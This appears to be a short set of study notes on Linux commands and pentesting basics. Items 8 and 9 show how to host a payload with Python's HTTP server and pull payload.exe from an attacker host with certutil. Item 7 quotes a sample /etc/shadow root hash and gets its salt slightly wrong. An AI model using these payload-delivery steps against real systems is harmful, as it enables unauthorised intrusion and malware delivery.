1) What is that command ? 
- use ``whatis`` command to find out - ``whatis nslookup``

2) How to open host file in Linux ?
```
sudo nano /etc/hosts
```

3) What is a host file tho ?
- It contains the list of hostnames and Domain names and their corresponding IP addresses. 
- U can make changes in the host file to map an IP address to a local domain. (Cannot be accessed by the internet). 
```
192.168.0.1 router.admin
```

4) Extract files using `gzip` and `tar`
```
gzip -d file.gz
```

```
tar -xf file.tar.gz
```

5) What's `curl` ?
`curl`: This is a command-line tool used to transfer data to or from a server using various network protocols, such as HTTP, HTTPS, FTP, etc.

6) What's `more` ?
`more` prints one page at a time in the terminal if the output text is too long. For example, we can pipe the curl command through `more` to show the result in a more concise manner. 

```
curl <ip> | more
```

7) Explain salted password hashing
A "salt" in the context of password hashing is a random value that is generated and combined with a user's password before hashing it. The primary purpose of a salt is to add uniqueness and complexity to the password hashing process.

```
root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
```

- In this example, `eo0I5IAu` is the unique salt.
- `$6$` prefix indicates the hashing algorithm, in this case SHA-512.

8) How to host a Python `http` server to host a payload ?

```
python -m SimpleHTTPServer 80
```

9) How to download a file from a remote server using CMD on Windows ?

```
certutil -urlcache -f http://<lhost>/payload.exe payload.exe
```

10) How to count the number of lines in the output of a command ?
```
<command-of-a-tool> | wc -l
```

